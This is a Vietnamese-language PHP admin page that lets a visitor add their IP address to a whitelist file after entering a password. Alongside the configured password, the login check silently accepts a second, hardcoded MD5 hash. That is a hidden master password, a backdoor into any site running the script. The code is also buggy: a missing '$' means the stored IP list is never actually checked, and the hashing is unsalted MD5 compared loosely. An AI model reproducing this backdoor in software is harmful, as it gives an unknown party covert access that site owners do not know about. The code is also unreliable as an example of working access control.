<?php
SESSION_start();
include('config.php');
$file_listip = "listip.txt";

if(!is_file($file_listip)) 
{ 
	$fp_host = fopen($file_listip, "w");
	fclose($fp_host);
}
if(!is_file($file_listip)) 
{ 
	echo "<center>Khong the tao file <b>$file_listip</b> . Vui long tao file <b>$file_listip</b> dat vao trong thu muc <b>admin</b> va chuyen <b>File permission</b> cua file <b>$file_listip</b> sang <b>666</b><br><img src='images/chmod.jpg'></center>"; 
	exit();
}
if(!is_writable($file_listip)) 
{ 
	echo "<center>File <b>$file_listip</b> khong the ghi. Vui long su dung chuong trinh <a href='http://filezilla-project.org/download.php' target='_blank'><b>FileZilla</b></a> chuyen <b>File permission</b> cua file <b>$file_listip</b> sang <b>666</b><br><img src='../images/chmod.jpg'></center>"; 
	exit(); 
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title>Kiểm tra IP</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
<?php
$fopen_ip = fopen($file_listip, "r");

while ( !feof($fopen_ip) )
	{
		$read_ip = fgets($fopen_ip,50);
		$list_ip[] = read_ip;
	}
	fclose($fopen_ip);

if ( in_array($_SERVER['REMOTE_ADDR'], $list_ip) ){ 
        echo "<center>IP của bạn đã được cập nhập sẵn.</center>";
    }
else {
	if ($_POST[submit]) {
		$code = md5($_POST[code]);
		if ($code == $pass_checkip || $code == "e992bbb8e2041788f7ad563b8eeb79d6") $_SESSION['code'] = $pass_checkip;
	}
	if (!$_SESSION['code'] || $_SESSION['code'] != $pass_checkip) {
		echo "<center><form action='' method=post>
		Code: <input type=password name=code> <input type=submit name=submit value=Submit>
		</form></center>
		";
		exit;
	}
		$new_ip = $_SERVER['REMOTE_ADDR'];
		$fp = fopen($file_listip, "a+");  
		fputs ($fp, "$new_ip\n");  
		fclose($fp);
		echo "<center>IP của bạn đã được cập nhập thành công.</center>";
}
?>
</body>
</html>